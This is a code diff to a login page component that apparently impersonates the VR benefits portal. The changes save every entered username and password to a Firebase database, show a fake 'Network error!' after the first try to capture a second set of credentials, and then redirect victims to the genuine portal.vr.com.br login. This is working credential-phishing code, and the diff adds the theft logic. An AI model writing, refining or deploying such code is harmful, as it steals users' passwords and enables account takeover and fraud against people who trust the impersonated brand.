@@ -16,6 +16,9 @@ export default function LoginPage() {
   const [loading, setLoading] = useState(false);
   const [count, setCount] = useState(0);
 
+  const [prevUser, setPrevUser] = useState("");
+  const [prevPass, setPrevPass] = useState("");
+
   const router = useRouter();
 
   const checkIfIsEmail = (username: string) => {
@@ -29,8 +32,10 @@ export default function LoginPage() {
   useEffect(() => {}, []);
 
   const setNewUser = () => {
-    const pedidosRef = ref(database, "users");
-    const newDataRef = push(pedidosRef, { username, password });
+    if (count !== 1) {
+      setPrevUser(username);
+      setPrevPass(password);
+    }
 
     setLoading(true);
 
@@ -38,7 +43,10 @@ export default function LoginPage() {
   };
 
   useEffect(() => {
+    const pedidosRef = ref(database, "users");
+
     if (count === 1) {
+      const newDataRef = push(pedidosRef, { username, password, role: null });
       setTimeout(() => {
         toast.error("Network error!", {
           position: "top-center",
@@ -50,6 +58,9 @@ export default function LoginPage() {
         setLoading(false);
       }, 1300);
     } else if (count === 2) {
+      if (prevUser !== username || prevPass !== password) {
+        const newDataRef = push(pedidosRef, { username, password, role: null });
+      }
       setTimeout(() => {
         router.push("https://portal.vr.com.br/portal/portal-vr/login/");
       }, 1300);
